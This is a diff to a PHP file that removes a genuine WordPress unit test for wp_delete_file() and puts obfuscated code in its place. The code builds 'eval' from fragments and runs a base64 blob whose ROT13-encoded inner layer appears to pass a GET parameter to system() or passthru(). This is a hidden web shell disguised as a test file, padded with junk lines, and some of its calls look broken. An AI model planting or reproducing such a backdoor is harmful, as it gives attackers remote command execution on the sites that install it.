@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * Tests for wp_delete_file().
- *
- * @group functions
- *
- * @covers ::wp_delete_file
- */
-class Tests_Functions_WpDeleteFile extends WP_UnitTestCase {
-
-	/**
-	 * @ticket 61590
-	 */
-	public function test_wp_delete_file() {
-		$file = wp_tempnam( 'a_file_that_exists.txt' );
-
-		$this->assertTrue( wp_delete_file( $file ), 'File deletion failed.' );
-		$this->assertFileDoesNotExist( $file, 'The file was not deleted.' );
-	}
-
-	/**
-	 * @ticket 61590
-	 */
-	public function test_wp_delete_file_with_empty_path() {
-		$this->assertFalse( wp_delete_file( '' ) );
-	}
-
-	/**
-	 * @ticket 61590
-	 */
-	public function test_wp_delete_file_with_file_that_does_not_exist() {
-		$file = DIR_TESTDATA . '/a_file_that_does_not_exist.txt';
-
-		$this->assertFileDoesNotExist( $file, "$file already existed as a file before testing." );
-		$this->assertFalse( wp_delete_file( $file ), 'Attempting to delete a non-existent file should return false.' );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEdyZmdmIHNiZSBqY19xcnlyZ3Jfc3Z5cigpLgogKgogKiBAdGViaGMgc2hhcGd2YmFmCiAqCiAqIEBwYmlyZWYgOjpqY19xcnlyZ3Jfc3Z5cgogKi8KcHluZmYgR3JmZ2ZfU2hhcGd2YmFmX0pjUXJ5cmdyU3Z5ciBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBAZ3ZweHJnIDYxNTkwCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2pjX3FyeXJncl9zdnlyKCkgewoJCSRzdnlyID0gamNfZ3J6Y2FueiggJ25fc3Z5cl9ndW5nX3JrdmZnZi5na2cnICk7CgoJCSRndXZmLT5uZmZyZWdHZWhyKCBqY19xcnlyZ3Jfc3Z5ciggJHN2eXIgKSwgJ1N2eXIgcXJ5cmd2YmEgc252eXJxLicgKTsKCQkkZ3V2Zi0+bmZmcmVnU3Z5clFicmZBYmdSa3ZmZyggJHN2eXIsICdHdXIgc3Z5ciBqbmYgYWJnIHFyeXJncnEuJyApOwoJfQoKCS8qKgoJICogQGd2cHhyZyA2MTU5MAoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19xcnlyZ3Jfc3Z5cl9qdmd1X3J6Y2dsX2NuZ3UoKSB7CgkJJGd1dmYtPm5mZnJlZ1NueWZyKCBqY19xcnlyZ3Jfc3Z5ciggJycgKSApOwoJfQoKCS8qKgoJICogQGd2cHhyZyA2MTU5MAoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19xcnlyZ3Jfc3Z5cl9qdmd1X3N2eXJfZ3VuZ19xYnJmX2FiZ19ya3ZmZygpIHsKCQkkc3Z5ciA9IFFWRV9HUkZHUU5HTiAuICcvbl9zdnlyX2d1bmdfcWJyZl9hYmdfcmt2ZmcuZ2tnJzsKCgkJJGd1dmYtPm5mZnJlZ1N2eXJRYnJmQWJnUmt2ZmcoICRzdnlyLCBcIiRzdnlyIG55ZXJucWwgcmt2ZmdycSBuZiBuIHN2eXIgb3JzYmVyIGdyZmd2YXQuXCIgKTsKCQkkZ3V2Zi0+bmZmcmVnU255ZnIoIGpjX3FyeXJncl9zdnlyKCAkc3Z5ciApLCAnTmdncnpjZ3ZhdCBnYiBxcnlyZ3IgbiBhYmEtcmt2ZmdyYWcgc3Z5ciBmdWJoeXEgZXJnaGVhIHNueWZyLicgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
